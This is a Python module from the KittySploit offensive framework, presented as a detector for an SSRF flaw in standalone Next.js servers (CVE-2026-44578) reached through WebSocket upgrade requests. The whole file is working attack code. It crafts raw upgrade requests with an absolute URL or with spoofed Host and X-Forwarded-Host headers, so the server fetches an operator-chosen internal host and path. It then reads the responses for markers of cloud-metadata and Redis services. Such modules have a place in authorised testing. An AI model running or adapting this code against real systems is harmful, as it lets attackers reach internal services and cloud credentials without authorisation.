#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import ssl
from contextlib import closing
from typing import List, Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_WS_HEADERS = (
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
)

_DEFAULT_MARKERS: Tuple[bytes, ...] = (
    b"SSRF_CONFIRMED",
    b"ami-id",
    b"computeMetadata",
    b"Server: SimpleHTTP/",
    b"Directory listing for",
    b"redis_version",
)


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Next.js WebSocket upgrade SSRF (CVE-2026-44578) — detect",
        "description": (
            "Raw TCP WebSocket upgrade to Next standalone; absolute-URL and/or Host-header variants. "
            "Does not import other Kittysploit modules."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-44578",
        "references": ["https://github.com/advisories/GHSA-c4j6-fc7j-m34r"],
        "tags": ["scanner", "nextjs", "ssrf", "websocket"],
    }

    internal_target = OptString("127.0.0.1:9999", "Internal host:port to reach via SSRF", required=False)
    internal_path = OptString("/", "Path on internal target", required=False)
    ssrf_variant = OptString("both", "absolute | host | both", required=False)
    socket_timeout = OptFloat(5.0, "Socket timeout (seconds)", required=False, advanced=True)
    extra_markers = OptString("", "Comma-separated extra SSRF markers", required=False, advanced=True)

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _next_authority(self) -> str:
        return f"{str(self._o(self.target) or '').strip()}:{int(self._o(self.port))}"

    def _norm_path(self, p: str) -> str:
        p = (p or "/").strip() or "/"
        return p if p.startswith("/") else "/" + p

    def _markers(self) -> Tuple[bytes, ...]:
        raw = str(self._o(self.extra_markers) or "").strip()
        extra: List[bytes] = []
        if raw:
            for part in raw.split(","):
                t = part.strip().encode("latin1", errors="ignore")
                if t:
                    extra.append(t)
        return _DEFAULT_MARKERS + tuple(extra)

    def _payload_absolute(self, next_auth: str, internal: str, path: str) -> bytes:
        path = self._norm_path(path)
        return (
            f"GET http://{internal}{path} HTTP/1.1\r\n"
            f"Host: {next_auth}\r\n"
            f"{_WS_HEADERS}"
            "\r\n"
        ).encode("latin1")

    def _payload_host(self, internal: str, path: str) -> bytes:
        path = self._norm_path(path)
        return (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {internal}\r\n"
            f"X-Forwarded-Host: {internal}\r\n"
            f"{_WS_HEADERS}"
            "\r\n"
        ).encode("latin1")

    def _send_raw(self, payload: bytes) -> Tuple[bytes, Optional[str]]:
        host = str(self._o(self.target) or "").strip()
        port = int(self._o(self.port))
        timeout = float(self._o(self.socket_timeout))
        use_ssl = self._to_bool(self._o(self.ssl))
        err: Optional[str] = None
        chunks: List[bytes] = []
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            if use_ssl:
                ctx = ssl.create_default_context()
                if not self._to_bool(self._o(self.verify_ssl)):
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            with closing(sock):
                sock.sendall(payload)
                sock.settimeout(timeout)
                try:
                    while True:
                        chunk = sock.recv(65536)
                        if not chunk:
                            break
                        chunks.append(chunk)
                except socket.timeout:
                    pass
        except (OSError, ssl.SSLError) as e:
            err = str(e)
        return b"".join(chunks), err

    def _looks_like_ssrf(self, response: bytes) -> bool:
        for m in self._markers():
            if m in response:
                return True
        head = response[:200].decode("latin1", errors="replace").lower()
        if head and "next" not in head and "404" not in head and "400" not in head and "200" in head:
            return True
        return False

    def run(self):
        var = str(self._o(self.ssrf_variant) or "both").strip().lower()
        if var not in ("absolute", "host", "both"):
            self.set_info(reason="invalid ssrf_variant")
            return False
        internal = str(self._o(self.internal_target) or "").strip()
        if not internal:
            self.set_info(reason="internal_target empty")
            return False
        path = str(self._o(self.internal_path) or "/")
        auth = self._next_authority()
        hit = False
        if var in ("absolute", "both"):
            resp, err = self._send_raw(self._payload_absolute(auth, internal, path))
            if not err and self._looks_like_ssrf(resp):
                hit = True
        if var in ("host", "both"):
            resp, err = self._send_raw(self._payload_host(internal, path))
            if not err and self._looks_like_ssrf(resp):
                hit = True
        if hit:
            self.set_info(reason="SSRF marker or non-Next 200 heuristic", confidence="medium")
            return True
        self.set_info(reason="no SSRF signal", confidence="low")
        return False
